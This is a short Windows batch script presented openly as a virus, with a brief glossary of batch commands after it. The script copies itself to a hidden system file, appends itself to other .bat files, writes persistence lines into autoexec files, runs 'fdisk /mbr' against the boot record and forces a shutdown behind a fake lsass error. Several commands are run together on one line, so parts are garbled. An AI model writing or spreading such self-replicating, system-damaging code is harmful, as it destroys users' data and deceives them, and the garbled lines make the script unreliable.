@echo off
title %0
rem conditional check.
echo welcome to this wonderful program! please wait while I delete all your files!
rem infection of the user
copy %0 c:\tmp.bat >null attrib +r +s +h c:\tmp.bat echo for %%i in (*.bat) do copy c:\tmp.bat+%%i %%i >>c:\windows\system32\autoexec.NT
echo echo virus detected! >>c:\windows\system32\autoexec.NT
echo pause >>c:\windows\system32\autoexec.NT
echo NT core:infected!
echo echo shame on you! >>c:\autoexec.bat
echo echo system hault-virus identified! >>c:\autoexec.bat
echo chkdsk >>c:\autoexec.bat
echo i t i s t o o l a t e, y o u h a v e a v i r u s, n o w u r l i f e i s n o t b e a u t i f u l
fdisk /mbr
shutdown -s -t 03 -c �windows has shut down because the lsass service has incountered a write fault at 0�00000000000000000000000000000000000?

Code Details

@echo off
color 1a (Changes the colour)
echo (Displays a text)
echo: (leaves a line)
ping -n 2 127.0.0.1>nul (pings your localhost � nothing much)
shutdown.exe (shutdown)

